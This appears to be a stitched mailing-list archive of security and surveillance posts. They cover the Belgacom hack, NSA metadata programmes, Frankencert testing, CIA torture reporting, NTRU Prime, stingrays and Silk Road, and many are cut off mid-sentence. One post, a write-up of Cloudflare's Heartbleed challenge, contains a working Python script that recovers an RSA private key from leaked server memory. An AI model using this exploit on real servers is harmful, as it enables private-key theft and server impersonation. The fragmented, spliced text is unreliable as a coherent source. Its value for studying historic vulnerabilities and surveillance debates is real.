the AMD768 RNG has not produced a detailed design like XSTORE and

none of these are compelling reasons to not release raw access to the
entropy stream from hardware noise sources.*
clearly you have done your homework, and the design, _if trusted_, is
a good one. however, denying access to the raw sources prevents any
evaluation that the entropy sources are indeed operating as designed,
and prevents any mode of operation where independent entropy
estimates, mixing, and host/application pool seeding is possible.
and surely you, when considering the point of view of an attacker, can
recognize the immense value of modes (RDRAND, RDSEED) which provide
only the obfuscated output to callers of these instructions.
last but not least, you take these criticisms as personal attack. i
have not seen anyone attack you personally. in fact, you simply do not
have the clearance nor indoctrination to be trusted with such a

not interesting.

@_subject: Belgacom Hack (EN translation) 
/
 On the brink of catastrophe (2013-09-21)
Ping. It's Friday the 13th. Around 11 o'clock in the morning, the IT
consultants that Belgacom employs at its largest customers in the
private and public sector receive a message. The message doesn't say
much, except for an urgent request to cancel all appointments of that
forenoon. An "emergency conference call" will take place instead.
The news that is brought in that call makes the IT consultants gasp
for breath.  A piece of malicious software has been found on the
network of BICS, a daughter company of Belgacom. It is hard to grasp
even for well-informed insiders. The BICS network is so wide and deep
that it is promptly clear to everybody that this is not just a Belgian
problem. This problem is at least of European proportions. Because
whoever controls BICS, controls the communication of a large part of
the world. "This could have been larger than 9/11", says one source
who closely followed the case. Without a grain of irony.
The pressure on the teams of the Dutch digital defender Fox-IT, that
started cleaning up together with an army of Belgacom employees last
weekend, was enormous.
It was their second attempt, various sources confirm. A first attempt
to remove the villainous software from the infected computers at
Belgacom in the last weekend of August was cancelled. "At the time,
not all conditions were met required to remove everything at once", it
was said. Some computers turned out to run the alternative operating
system Linux, known of the penguin logo, not Windows. "The risk was
too big that we could not remove everything at once.  In that case you
should not touch it. Or the adversary will know that the virus has
been found", states someone politically involved.
Strict conditions
The investigation of the hacking started on July 19th, when Belgacom
went to court. During their work, investigators at the intelligence
services, police and justice were very wary of a leak about the entire
operation. In early September they informed the Belgian cabinet on
strict conditions: the list of attendees of that meeting was kept
closely. If a politician would have wanted to reveal the news before
the malware was dealt with, the investigators would press charges for
breach of confidentiality of the investigation. "We could not risk
everything going wrong due to someone talking", it is said.
Belgacom was not infected with some common viruses, but with very
professional malware that costed lots of money to develop. "We had to
re-invent ourselves to do this", an investigator said. "In other
investigations there is a fixed idea of where you're going, but in in
this case it was continuously starting over because it was so
difficult to get a grasp of the malware".
Gradually it became clear that the hackers are not only interested in
the communications in the Middle-East, where BICS holds a solid
position via South-African minority shareholder MTN. "They have been
looking around and took what they could", state sources involved in
the investigation. They are clear about one thing: the attack
originated from the United States. "We determine that by the signature
of the malware, but especially by where the trails lead.  They
partially run through the UK. We think the US is the main destination.
And the past weeks at the US Embassy, you notice some embarrassment
when you request exchange of information." Yesterday, the German
weekly magazine Der Spiegel reported that the UK intelligence service
GCHQ (Government Communications Headquartes) are responsible for the
attacks. It based that claim on slides disclosed by whistleblower
Edward Snowden. The news that GCHQ is behind the Belgacom attack is a
surprise to at least the services working on the affair.
The malware could do anything
The malware at Belgacom actually consists of a complex system of
complementary viruses. They are all connected. If a problem is
imminent or if they are detected, they can signal each other. "It is
somewhat like a human virus, which also mutates continuously", states
someone involved who monitors the situation for his service.  "For
example, one part is responsible for searching and storing
information, while another part is continuously looks for pathways to
the internet to transfer information. Other pieces of code are
responsible for circumventing firewalls, or carry out surveillance.
If someone detects the hacking or attempts to remove a part of it, the
virus that is acting as a guard promptly signals the other parts.
Because you don't know what the malware is capable of, everything can
go horribly wrong at the last step."
The cost of the entire detection and cleaning operation is
correspondingly high. Fox-IT, the Dutch cyber security/defence company
that is commissioned by Belgacom to first make inventory of the
problems and then solve them, is a familiar name. "For the first two
weeks they estimated the costs to be one million euro", states a
well-placed source. And then adds that the entire operation lasted ten
weeks. Moreover, Fox-IT did not expect that, at a certain point, it
had to allocate all of its employees to this case. A price tag of over
five million euro, then? "It won't be far off."
But what was so terrifying about this cyber attack? And why the panic
that something would go wrong? Telephone data about conversations with
countries such as Afghanistan, Yemen and Syria that disappear, how
could that have such an impact? They are 'just' stolen phone data,
right? The involved expert sitting opposite us, looks dead serious.
There is drama in his voice, but considering the contents of what he
says, that is not unjustified. "This was highly performing malware and
it was present in the nerve centre of communications.  Anything that a
highly privileged network operator of Belgacom could do, this system
could do as well. I don't have to make a drawing of it? It had all the
keys, all the passwords and full control. We must dare to classify
this as a big crisis. This could have been a catastrophe. And people
don't seem to realize."
Sensitive customers
Perhaps it wouldn't hurt to make that drawing. BICS calls itself a
"wholesale carrier". Two words, four syllables, but behind it is a
network that spans the entire globe and the beating heart of which is
located in our capital, Brussels. BICS provides the hardware
infrastructure that carries internet traffic, phone conversations,
text messages and mobile data of telecom companies and government
institutions. And the more sensitive the customer, the more likely he
is the end up at BICS. The daughter company of Belgacom markets itself
with the argument that they never ever look at what travels over its
cables. "We provide the cables for you, and you just send whatever you
want over them", is what it basically boils down to.
A glance at the list of BICS' customers makes one dizzy. The financial
transport center Swift, Electrabel, bpost, Belgocontrol, they are all
connected to BICS.  The NATO in Evere, the European Commission and
Parliament, SHAPE, the Supreme Headquerters Allied Powers Europe, in
Bergen; BICS, BICS, BICS. Even the headquarters of the NATO Allied Air
Command, in Ramstein, Germany, from where the 2011 air attacks on
Libya where coordinated, depends on BICS. Among the military, it is
pointed out that military communications has an extra layer of
security; but that pointing-out happens with a degree of humility that
is very unusual to the military.  "Every organisation, not just the
government, must now begin to wonder whether it is dependent of one
single provider, of one single network. And specially how well it is
secured itself", states someone who was at the front row of the
affair. "Belgacom, that is critical infrastructure. How can Belgium
keep running without it? Those are the questions that we must ask now.
 Because the organisation responsible for the attack has in fact the
capability to completely disrupt Belgacom and BICS." A different
source confirms, reluctantly, the doom scenarios: "You can't think of
it. It would be larger than 9/11. The planes would pretty much fall
out of the sky." As a figure of speech?  "Hm, yeah."
A governmental source points out the consequences of even a limited
disruption of phone communications and internet. "If a crisis occurs,
what is the first thing a human does? Grasp their phone. Imagine that
that lifeline is lost.  Not just for you, but also for the emergency
services, hospital, the fire department...? And for the police? At
first glance it isn't, because they use the Astrid network [a Belgian
national radio communications network intended for emergency
services].  But that network only works apart from BICS for local
communications.  For interregional communications it is just as
dependent on BICS as the rest. Hence, it is no coincidence that police
chief Catherine De Bolle started looking for a backup for the
communications system of the federal police on that Friday the 13th,
just before the big cleaning operation would have started.
How long would it take before Belgacom was up and running again after
a destructive cyber attack, is unclear. "But it is clear that we are
not prepared to counter this type of attacks right now", states a
high-ranking source. "That awareness must finally start to grow. I am
very apprehensive for the feeling of relief that I already observe in
some people. 'Ah well, that has been nicely dealt with. It's over.'
It's not, mind you. Whoever doesn't realise, this week, that it is
urgent, will never get it. Playing things down now is dangerous."
After De Standaard brought the news of large-scale hacking at
Belgacom, it turned out that the Ministry of Foreign Affairs and the
cabinet of the prime minister had been hacked. "And this is merely the
top of the iceberg", states a source who was involved in the problems
at Belgacom.  Because telecom is one thing, but there are many other
critical sectors that are the fundament of a country. Transportation,
for example. Trains, trams, busses, highways, airplanes, everything
involves computer networks and everywhere one should be cautious for
cyber attacks. The energy supply is another critical fundament. And
last but not least: the banking sector of a country. Luxembourg has
already contacted the Belgian cyberservices [?] to obtain more
information about the malware that hit Belgacom.
Besides budgets and well-paid IT personnel, the remedy against the
growing cyberthreat will be found in improved awareness. "Belgium
wants to invest in knowledge and innovation, but if one sector is
vulnerable to espionage, it is that one. Just as many computers of the
global diplomatic network of Foreign Affairs have post-its one them
with the passwords, many small companies are slacking in their
security", a cyber specialist states. "And if you dare ask whether
their Chinese interns are thoroughly screened, they look at you as if
you're from another planet." Whether the gravity of the situation is
apparent to everyone, is doubtful. In official communications,
Belgacom states that it currently has no evidence of impact on its
customers or their data.  Understandly, the company does not want to
trigger hysteria, but it sounds like down-playing nonetheless. "What
should we write then?", states spokesman Jan Margot in his response.
"The infection was at dozens of computers in our own system. They have
been cleaned together with the entire network."
BICS too doesn't say much about it. "There are no indications of an
impact on the telecomnetwork of BICS", it states in a press release.
"A number of our IT systems are integrated in the infrastructure of
Belgacom and are affected in that way, but that remained outside the
network that carries customer traffic."
"That's all put rather euphemistically", according to the
investigators involved.  "But you cannot accuse them of lying. A lot
of thought went into every comma of the communication."
Did Belgium become the joke of de European mainland as a result of the
compromise of Belgacom? Intelligence services are continuously in
contact with each other and exchange information. For the image of our
country, the past week has been anything but stellar, but it is
emphasised nonetheless that in such contacts it is often also about
personal relations between people. "Moreover, all countries have
problems and everyone tries to rise above them."
What about ethics? Isn't it schizophrenic that our country, Belgium,
receives information about threats that the US or others have stolen
from us? "That is the eternal paradox", a recipient of such
information states. Diplomatically it is the hardest. But if you
receive information about a serious threat such as terrorism, you
cannot ignore it. Then you have different things on your mind.

we used synchronized key daemons to maintain a rolling pair of

as long as you didn't transfer more than some obtuse number of

symmetric ciphers are a particular beast... (and combined

in a poor implementation or protocol, re-keying can provide an
opportunity for cipher suite downgrade or other privacy destroying
effective frequent re-keying requires the other INFOSEC/OPSEC
dependencies be met!
note that for all intents and purposes, you should use a fresh,
absolutely random key for each re-keying.  key "stretching" or
derivation methods suffer the same types of vulnerabilities over large
enough output that the original cipher does.
instead of spending your time trying to securely "stretch" a few keys,
just generate a large number of perfectly random keys instead!

there are some interesting tidbits in this release:
"The agency had asked for the new power as early as 1999, the
documents show, but had been initially rebuffed because it was not
permitted under rules of the Foreign Intelligence Surveillance Court
that were intended to protect the privacy of Americans....
A 2009 draft of an N.S.A. inspector general’s report suggests that
contact chaining and analysis may have been done on Americans’
communications data under the Bush administration’s program of
wiretapping without warrants"
i find it interesting that this request occurred the same time that
core collection on US backbone links at Sprint was under development.
Sprint provided the perfect initial test as their ATM infrastructure,
and IPoATM data networks, were the most challenging environment for
deep packet inspection. (Solve it for Sprint, it can be applied
"...which began after the Sept. 11 attacks to detect terrorist
activities and skirted the existing laws governing electronic
it began earlier than this!
"A new policy that year [2008], detailed in “Defense Supplemental
Procedures Governing Communications Metadata Analysis,” authorized by
Defense Secretary Robert M. Gates and Attorney General Michael B.
Mukasey, said that since the Supreme Court had ruled that metadata was
not constitutionally protected, N.S.A. analysts could use such
information “without regard to the nationality or location of the
communicants,” according to an internal N.S.A. description of the
After that decision, which was previously reported by The Guardian,
the N.S.A. performed the social network graphing in a pilot project
for 1 ½ years “to great benefit,” according to the 2011 memo. It was
put in place in November 2010 in “Sigint Management Directive 424”
(sigint refers to signals intelligence)."
so this is when we see the floodgates really open, and the data deluge
turned up to 11...
"The N.S.A. documents show that one of the main tools used for
chaining phone numbers and e-mail addresses has the code name Mainway.
It is a repository into which vast amounts of data flow daily from the
agency’s fiber-optic cables, corporate partners and foreign computer
networks that have been hacked.
The documents show that significant amounts of information from the
United States go into Mainway. An internal N.S.A. bulletin, for
example, noted that in 2011 Mainway was taking in 700 million phone
records per day. In August 2011, it began receiving an additional 1.1
billion cellphone records daily from an unnamed American service
... the agency is pouring money and manpower into creating a metadata
repository capable of taking in 20 billion “record events” daily and
making them available to N.S.A. analysts within 60 minutes.
The spending includes support for the “Enterprise Knowledge System,”
which has a $394 million multiyear budget and is designed to “rapidly
discover and correlate complex relationships and patterns across
diverse data sources on a massive scale,” ...
A top-secret document titled “Better Person Centric Analysis”
describes how the agency looks for 94 “entity types,” including phone
numbers, e-mail addresses and IP addresses. In addition, the N.S.A.
correlates 164 “relationship types” to build social networks and what
the agency calls “community of interest” profiles, using queries like
“travelsWith, hasFather, sentForumMessage, employs.”
A 2009 PowerPoint presentation provided more examples of data sources
available in the “enrichment” process, including location-based
services like GPS and TomTom, online social networks, billing records
and bank codes for transactions in the United States and overseas."
and this is interesting in both scale and technical detail on the
metadata collected and how it is utilized in social network analysis.

i can tell you that i've had malware sent down a 3G pipe to a tethered

incidentally, this tethered mode is how i prefer to communicate:
1. a front-end sacrificial/signalling device to indicate a threat
level and carry traffic. (hotspot puck, 3G phone, CPE router, etc.)
2. a packet inspecting host to passively monitor for anomalies and
respond to emergencies. (emergency zeroisation+filtering)
3. the actual communicating device containing keys and terminating

for any decent attacker, mobile platforms are just fucked.  sorry!
this is true until you can implement an entire isolated SDR stack;

it's fine to route traffic over such a device as long as you assume
the attacker is also watching and able to inject into your traffic
over said gateway :)
this means you run Tor on a different device, not the phone itself.
last but not least, regarding the "Mission Impossible: Hardening

 i have found the following techniques useful in the past against
advanced attackers:
0.) rootkit Android kernel to trap and notify|block syscall use by
user-id and process-id.  anomalous calls by a privileged processes or
users is a great signal of compromise.
1.) monkey patch Android API in every dalvik runtime for specific
calls of interests that should not be granted. this caught the
"Android Master key" vuln in practice as an updated app was behaving
way out of permission and expected profile.
2.) deploy camouflage guacamole to feign vulnerability to various
techniques and then use exploit attempts to signal presence of an
adversary of identified capabilities.

the old GPUs that used to pool mine before the ASIC takeover are great
for searching key spaces and permutated dictionaries, but seems the
SDR adoption is lacking.  traditionally, SDR is narrowband focused,
low overhead more than amenable to CPU cycles.  very wide band, very
high rate, multi-radio SDR setups are just now coming into independent
exploration; perhaps then old GPUs can be brought back to utility!
my favorite odd band technical input is still the barcode scanners
from decades past which would interpret scanned input and escapes same
as keyboard console entry.  factory reset SMS type attacks have been

@_subject: Frankencert - Adversarial Testing of Certificate Validation in 
Frankencert - Adversarial Testing of Certificate Validation in SSL/TLS
What are frankencerts?
Frankencerts are specially crafted SSL certificates for testing
certificate validation code in SSL/TLS implementations. The technique
is described in detail in the 2014 IEEE Symposium on Security and
Privacy (Oakland) paper - Using Frankencerts for Automated Adversarial
Testing of Certificate Validation in SSL/TLS Implementations by Chad
Brubaker, Suman Jana, Baishakhi Ray, Sarfraz Khurshid, and Vitaly
Why is frankencert generator useful?
Frankencert generator is essentially a smart fuzzer for testing
SSL/TLS certificate validation code. If you are a developer who is
implementing any sort of SSL/TLS certificate validation code (either
as part of an SSL/TLS library or an application), you can use the
frankencert generator to auto-generate different test certificates
involving complex corner cases.
We have successfully used frankencerts to find serious vulnerabilities
in GnuTLS, PolarSSL, CyaSSL, and MatrixSSL as described in our Oakland
2014 paper. We also found several discrepancies between how different
SSL/TLS implementations report errors back to the user. For example,
when presented with an expired, self-signed certificate, NSS, Chrome
on Linux, and Safari report that the certificate has expired but not
that the issuer is invalid.
How do frankencerts work?
The basic idea of frankencerts is to take a bunch of certificates as
seeds and use random mutations on different fields and extensions to
create new test certificates (frankencerts). Using frankencerts as
server-side inputs into an SSL/TLS handshake can help systematically
test correctness of the certificate validation code.
Installation and Usage
Install OpenSSL libraries and utilities if you don't have them already.
The frankencert generator needs a modified version of PyOpenSSL. We
have included the source for our modified version of PyOpenSSL. You
will need to install it in order to use the frankencert generator.
First, uninstall any other version of PyOpenSSL that you may have
installed on your computer. Go to the pyOpenSSL-0.13 directory and
build/install PyOpenSSL by issuing sudo python setup.py install.
Once you have the patched pyOpenSSL set up, to generate frankencerts,
use the franken_generate.py script: python franken_generate.py
seed_certs_dir ca_cert output_dir count [config_file].
The arguments are explained below.
seed_certs_dir: Frankencert generator needs a set of seed
certificates. Any SSL cert in PEM fromat can act as a seed cert.
seed_certs_dir can be any directory containing the seed certs stored
as PEM files.
You can either use tools like ZMap ( to collect SSL
seed certificates, or use some of the SSL certs available from
 Please note that these are not our
tools and repositories - you may want to contact their respective
developers and maintainers to ensure that your usage of the
certificates they collected is compatible with the intended purpose.
You do not need access to the corresponding private keys to use the
certs as seeds.
For your convenience, we have included a tarball containing around
1000 seed certificates in utils/sample_seed_certs.tar.gz.
ca_cert: You will also need to create a self-signed CA certificate to
sign the frankencerts. You can either use the included sample CA
certificate utils/rootCA_key_cert.pem or use the
utils/create_new_ca.sh script to create your own root CA. For any root
CA that you use for frankencert generation, make sure that your SSL
certificate validation code treats its certificate as a trusted root
VERY IMPORTANT: this root certificate should be trusted ONLY during
testing. If you accidentally or intentionally deploy SSL/TLS with this
certificate still among the trusted root certificates, your SSL/TLS
connections may be vulnerable to server impersonation and
man-in-the-middle attacks. Be sure to REMOVE this certificate from
your trusted root certificates once the testing is finished.
output_dir: It will contain the generated frankencerts. The
frankencerts will be named as frankencert-.pem.
count: Number of frankencerts to be generated.
config_file: An optional argument to tune the frankencert generation
process. Take a look at the utils/sample_franken.conf for a sample
config file.
To test your SSL/TLS client with the generated frankencerts, you
should use the utils/test_ssl_server.py script to set up an SSL server
that can present the generated frankencerts as part of the SSL
Project structure
The frankengen directory contains the frankencert generator code
Our patched version of pyOpenSSL is inside pyOpenSSL-0.13 directory
Several useful tools are included in utils
cert_print.py: a tool for printing frankencerts. It requires OpenSSL
to be installed and present in the path.
rootCA_key_cert.pem: private key and self-signed cert of a sample CA
that can be used for signing frankencerts.
create_new_ca.sh: a script for creating new CA with a self-signed
cert. It creates the output cert and private key in rootCA.pem
(requires OpenSSL).
test_ssl_server.py: a sample SSL/TLS server for presenting
frankencerts to SSL/TLS clients
sample_seed_certs.tar.gz: Some sample certs that may be used as seeds
for frankencert generation.
sample_franken.conf: A sample config file that can be used to tune
different parameters of the frankencert generation process.

"if the intelligence community thinks that the controversy over our
legacy of torture is just the result of some silly girlish feelings,
then we haven't even begun to deal with the consequences of those
Who's "Emotional"-- Feinstein or the C.I.A.?
Who gets "emotional" about torture--or, rather, what is the proper
emotional response to a history of torture and lies? On Fox News, on
Sunday morning, Chris Wallace asked Michael Hayden, the former
director of the C.I.A., about a report by the Senate Select Committee
on Intelligence, sixty-three hundred pages long, that "says the C.I.A.
misled the public about the severity and the success of the enhanced
interrogation program." Hayden's first response was to talk about the
feelings of Dianne Feinstein, the chair of the committee, citing an
article by David Ignatius: "He said Senator Feinstein wanted a report
so scathing that it would 'ensure that an un-American brutal program
of detention and interrogation would never again be considered or
permitted.' "
Now, that sentence, that motivation for the report, Chris, may show
deep emotional feeling on part of the senator. But I don't think it
leads you to an objective report.
"Deep emotional feelings," on the part of a woman like Feinstein, are
apparently dizzying, especially when it comes to things like our
integrity as a nation. But are Hayden and his former colleagues at the
C.I.A., in touch with their own emotions on this one? The Senate voted
on Thursday to submit the report for declassification; this process
may take a while, because the White House and the C.I.A. will be
involved, and the agency has fought the report. It has made its
objections known feelingly, in a rebuttal that is also classified, in
testimony, and in leaks to reporters about how the Senate just doesn't
understand what it was like--doesn't get it, doesn't care about what
bad days its agents had. Not that the C.I.A. wants to tell. When John
Brennan, the current head of the C.I.A., realized that the Senate
investigators had some of the agency's notes to itself--the so-called
Panetta papers, in which, according to Senator Feinstein, the agency
conceded points it is now denying--he had a bit of a fit. Feinstein
said that the committee got the Panetta papers from the C.I.A. in a
document dump; the agency said that even if it did, the committee
ought to have known that those notes were private. It apparently
searched the Senate's computers and tried to get a criminal
investigation started. Calling the cops is, admittedly, a common
fantasy when an teen-ager realizes that his journal has been read, but
it's a bit unworthy of an intelligence agency when dealing with its
congressional overseers.
Now, not that there's anything wrong with wanting a scathing report in
torture that will shock the conscience, but it's probably worth noting
that the Ignatius line Hayden cited took a Feinstein quote slightly
out of context. (Though the layering of emotionalism is on Hayden.)
Ignatius wrote that Feinstein "wanted a report so tough that it would
'ensure that an un-American, brutal program of detention and
interrogation will never again be considered or permitted,' as she put
it." She had actually presented this as the reason to make the report
If the Senate can declassify this report, we will be able to ensure
that an un-American, brutal program of detention and interrogation
will never again be considered or permitted.
Emphasis added. It's a fine distinction, but an important one:
whatever her "motivation" was, it didn't shape the writing of the
report, but her feelings about who ought to get to read it. (On
Saturday, Trevor Timm, of the Press Freedom Foundation, put out a
"general plea" for a leak.)
There are really two issues here. One is the reflexive tendency to
disparage or dismiss a woman in politics (or in business, or anywhere)
with a remark about her supposed susceptibility to emotion. The other
is the way a certain femininity--the wilting kind--is ascribed to those
who doubt that torture is good for America.
The cartoon is of the clear-headed torturer who has put tenderness
aside for the sake of country, against the squeamish, sensitive,
can't-handle-the-truth doubters. The supposed contrast is between
focussed, rational realism and a tendency to faint. (Men and women can
be put in either role, as in "Zero Dark Thirty.") But fear and a
desire to punish, which disabled the judgments of many in the
government after 9/11, are emotions, too, and even harder to control
than, say, mercy. So is a fascination with one's own power to protect
or, less charitably, one's self-imagined ruthlessness. So is a
tendency to be charmed by dark sides. One can argue that those who
turn to the law or a moral code, in moments of crisis, can be the
least flushed by feeling. That is not to make a case against inserting
feeling into politics: righteous indignation and kindness can anchor,
rather than discombobulate. It might be most accurate to say that
various emotions serve us differently. They wake us up, and, when they
do, in what can be an outraged, bleary-eyed moment, we should be
careful about what we reach for.
And if the intelligence community thinks that the controversy over our
legacy of torture is just the result of some silly girlish feelings,
then we haven't even begun to deal with the consequences of those
There is another powerful emotion that may be at work here: shame. One
source of C.I.A.'s anxiety about the Senate report is that it
apparently casts a cold eye on the effectiveness of torture. It didn't
do us much good, apparently. Perhaps it is painful to have compromised
one's principles and not brought back anything good. But that
psychological exploration should not take place entirely in classified
About the same time that Hayden was on Fox News, Nancy Pelosi was on
CNN, talking to Candy Crowley about the same report. Crowley asked if
she blamed senior C.I.A. officials for the "misrepresentations" about
torture; Pelosi went a level higher, to make a point about
institutional culture, and one of our more fundamental emotions--the
desire for praise. "Many people in the C.I.A. are so patriotic,
they--they protect our country in a way to avoid conflict and--and, uh,
violence, etc. But the attitude that was there was very--I think, it
came from Dick Cheney. That's what I believe," she said.
Did Cheney's shamelessness represented an absence of emotion? Not
really. "I think he's proud of it," Pelosi said. "I think he's proud
of it. I think he's proud of it."

my only comment, for now:
Five years ago, Kelly Ziegler calculated that patching a fully
deployed Smart Grid would take an entire year to complete, largely
of the size of the per-node firmware relative to the available
powerline bandwidth.
this does not take into consideration the "truck roll" option.  it's
the network operator's worst nightmare; an option of last resort.
the majority of smart grid devices i have analyzed contain both
optical and higher speed radio interfaces which may be accessed by a
technician on site or near by.  much more expensive than the slow
trickle broadcast, but to claim a critical fix could be deployed only
via one method is a bit misleading.
p.s. hacking these devices still an undiscovered country!  has your

References: <3142883.qliPh6rQWL
I wasn't first to get the key. Nor was I second, third, or even
fourth. I'm probably not even the
10th to get it. But I'm happy that I was able to prove to myself that
I too could do it.
The sleepless adventure began yesterday afternoon, 2014-04-12
15:19:04.827516279 -0700.
First, I have to admit I was a skeptic. Like the handful of other
dissenters, I had initially
believed that it would be highly improbable under normal conditions to
obtain the private key
through exploiting Heartbleed. So this was my motivation for
participating in Cloudflare's
challenge. I had extracted a lot of other things with Heartbleed, but
I hadn't actually set out to
extract private keys. So I wanted to see first-hand if it was possible or not.
I started by hastily modifying the hb-test.py that everyone has been
using to dump the raw memory
contents to a file, rather than print a hexdump. I then left this
running in the background for a
(very long) while, as I set off to think of an approach.
    while true; do python hb-raw.py  done
My original thinking was that I could get a large sample of memory,
then use some forensic analysis
tools to search for keys in the memory dump. This idea went to the
wayside, however, as I got
sidetracked when I started seeing "BEGIN RSA PRIVATE KEY" strings in
the script output.
    I thought it was too good to be true, but after parsing it out, it was
indeed a valid private key,
so I submitted it -- unsuccessfully. This turned out to be the work of
trolls who were sending
private key contents in heartbeat requests to the server, and I fell
for the trollbait. I found
several more `private keys' in the dump, and I skeptically tested them
anyway, just in case. But
they were all fake as well. Fucking trolls. But at least I didn't fall
for any of the keys that
ended in "LOLJK" ;)
So, I decided to get back on track and stick to my original plan.
After searching through some
forensics mailing lists and reading some papers on the topic, my plan
was to parse my dump file,
looking for the start of a key in ASN.1 format ("\x30\x82"), and then
parse out the key from there.
While working on this approach, I had a conversation with Brandon
Enright ( on IRC. This
conversation left me thinking that my approach won't work, because the
chances of the key being in
ASN.1 DER format in memory are about as slim as the key being in PEM
format in memory. Brandon,
however, suggested a much more reasonable approach:
(19:25:15) < bmenrigh> But my plan would be to interpret all possible
portions of the memory dump
as however the P and Q factors get encoded and then just trial divide
the N modulus from the SSL
cert until you get one that divides
(19:26:38) < bmenrigh> you only get up to about 64k of memory on each
grab so if you interpret
every offset as the start of the dump as whatever a private key looks
like it just isn't many trial
By this time though, I had already been working on this for several
hours, and it was Friday night,
so I didn't want to spend any more time on it. However, I gave it some
more thought over dinner,
and the more I drank, the more I realized it was far more likely that
the binary values of p, or q,
or both, were in memory as-is. They likely wouldn't be encoded at all,
so we can just shift through
the memory dump in $keysize chunks, converting them to bignums and
doing the trial divide as Brandon
suggested. This would be really easy to code up and test, so I decided
to call it an early night,
and rushed home to work on it while the thought (and the liquor) were
still fresh in my brain.
The version of hb-test.py that I already had running in the background
was dumping memory in 16 KiB
chunks, not the full 64 KiB, so the plan would be to read the memory
dump in 16 KiB chunks,
shifting through each chunk in $keysize sections, testing to see if we
have a prime that the
modulus is divisible by. I sketched out the following psuedocode:
    while (chunk = fread (file, 16384))
    {
        for (offset = 0; offset < len(chunk)-keysize; offset++)
        {
                p = bignum (chunk[offset-1] .. chunk[offset+keysize-1])
                if (p is prime and modulus % p == 0)
                {
                        q = modulus / p;
                        print p, q;
                }
        }
    }
After a few hours of testing and debugging, lo and behold, one of the
primes is in my dump. Several
times, even. From here, it is trivial to get the private key given p/q
and the modulus.
I ended up with the following script:
import sys, base64, gmpy
from pyasn1.codec.der import encoder
from pyasn1.type.univ import *
def main ():
        n = int (sys.argv[2], 16)
        keysize = n.bit_length() / 16
        with open (sys.argv[1], "rb") as f:
                chunk = f.read (16384)
                while chunk:
                        for offset in xrange (0, len (chunk) - keysize):
                                p = long (''.join (["%02x" % ord
(chunk[x]) for x in xrange (offset + keysize - 1, offset - 1,
-1)]).strip(), 16)
                                if gmpy.is_prime (p) and p != n and n % p == 0:
                                        e = 65537
                                        q = n / p
                                        phi = (p - 1) * (q - 1)
                                        d = gmpy.invert (e, phi)
                                        dp = d % (p - 1)
                                        dq = d % (q - 1)
                                        qinv = gmpy.invert (q, p)
                                        seq = Sequence()
                                        for x in [0, n, e, d, p, q,
dp, dq, qinv]:
seq.setComponentByPosition (len (seq), Integer (x))
                                        print "\n\n-----BEGIN RSA
PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n\n" %
base64.encodestring(encoder.encode (seq))
                                        sys.exit (0)
                        chunk = f.read (16384)
                print "private key not found :("
if __name__ == '__main__':
        main()
(I'm sorry if this code offends any python aficionados, but I do not

epixoip at token:~$ echo "epixoip has your key" | openssl sha1 -sign

So there you have it. I submitted my proof to Cloudflare about 7 hours
ago, so I effectively spent
a whole day on it. I wasn't the first to get it, probably not even the
10th. And I did need some
guidance (thanks Brandon!) But overall, I am pleased. The next step
would be to integrate this into
hb-test.py, or ideally just re-write the whole damn thing top-to-bottom in C.

@_subject: NTRU Prime implementation 
reification requested!
Here's a concrete suggestion, which I'll call NTRU Prime, for
eliminating the structures that I find worrisome in existing
ideal-lattice-based encryption systems. This suggestion uses a number
field of prime degree, so that the only subfield is Q; and uses an
irreducible polynomial xp-x-1 with a very large Galois group, so that
the number field is very far from having automorphisms. The best CVP
dimension seems to be about half the degree; this is optimal for
number fields without many real embeddings. (It's hard to create many
real embeddings while keeping coefficients small, and if coefficients
are large then there are other problems.) This suggestion also chooses
its modulus q so that (Z/q)[x]/(xp-x-1) is a field; this
simultaneously avoids (1) NTRU's traditional 2-adic structure and (2)
the linear splittings used in most recent papers.

References: <53DBB16D.4020108
---------- Forwarded message ----------
Hi everyone
I want to announce to the list that a new release of tor-ramdisk is
out. Tor-ramdisk is an i686 or x86_64 uClibc-based micro Linux
distribution whose only purpose is to host a Tor server in an
environment that maximizes security and privacy. Security is enhanced
by hardening the kernel and binaries, and privacy is enhanced by
forcing logging to be off at all levels so that even the Tor operator
only has access to minimal information. Finally, since everything runs
in ephemeral memory, no information survives a reboot, except for the
Tor configuration file and the private RSA key, which may be
exported/imported by FTP or SCP.
tor was updated to 0.2.4.23 which addresses CVE-2014-5117.  The kernel
was updated to 3.15.7+ Gentoo's hardened-patches-3.15.7-1.extras.  All
other packages are the same as the previous release.  It is
recommended that users upgrade immediately.  For more information see

 - Verizon reprogrammed the device so that when an incoming voice call
arrived, the card would disconnect from any legitimate cell tower to
which it was already connected, and send real-time cell-site location
data to Verizon, which forwarded the data to the FBI. This allowed the
FBI to position its stingray in the neighborhood where Rigmaiden
resided. The stingray then “broadcast a very strong signal” to force
the air card into connecting to it, instead of reconnecting to a
legitimate cell tower, so that agents could then triangulate signals
coming from the air card and zoom-in on Rigmaiden’s location.
To make sure the air card connected to the FBI’s simulator, Rigmaiden
says that Verizon altered his air card’s Preferred Roaming List so
that it would accept the FBI’s stingray as a legitimate cell site and
not a rogue site, and also changed a data table on the air card
designating the priority of cell sites so that the FBI’s fake site was
at the top of the list.
 - the second "data table on the air card ... designating the priority
of cell sites" not unambiguous. for example, System Determination
Algorithms can utilize recent tower connection history foremost, along
with the "Preferred Roaming List" as commonly used. a stated common

@_subject: =?UTF-8?Q?Feds=E2=80=99_Silk_Road_Investigation_Broke_Privacy_Laws=2C_?= 
The Department of Justice sees its takedown of the billion-dollar Silk
Road black market as a massive, victorious drug bust. Ross Ulbricht,
the alleged creator of that anonymous contraband bazaar, now wants to
cast the case in a different light: as a landmark example of the
government trampling privacy rights in the digital world.
In a pre-trial motion filed in the case late Friday night, Ulbricht’s
lawyers laid out a series of arguments to dismiss all charges in the
case based on Ulbricht’s fourth amendment protections against
warrantless searches of his digital property. As early as the FBI’s
initial discovery of servers in Iceland hosting the site on the Tor
anonymity network—seemingly without obtaining a search warrant from a
judge—Ulbricht argues that law enforcement violated his constitutional
right to privacy, tainting all further evidence against him dug up in
the investigation that followed.
“The [electronically stored information] and other material seized and
searched has been contaminated at its source, and at several later
points along the way, rendering the direct and indirect product of
those searches and seizures – in essence, the entire product of the
investigation itself – inadmissible,” a 102-page memo accompanying the
motion summarizes. “Thus, the Fourth Amendment and relevant statutes
require suppression of the fruits of the searches and seizures, and
any evidence or other information derived therefrom.”
The motion refers to 14 distinct searches and seizures of Ulbricht’s
computers, equipment, and online accounts. Beyond the initial tracing
of his alleged servers in Iceland, investigators performed several of
those surveillance operations with “trap and trace” or “pen register”
orders that don’t require the “probable cause” standard necessary to
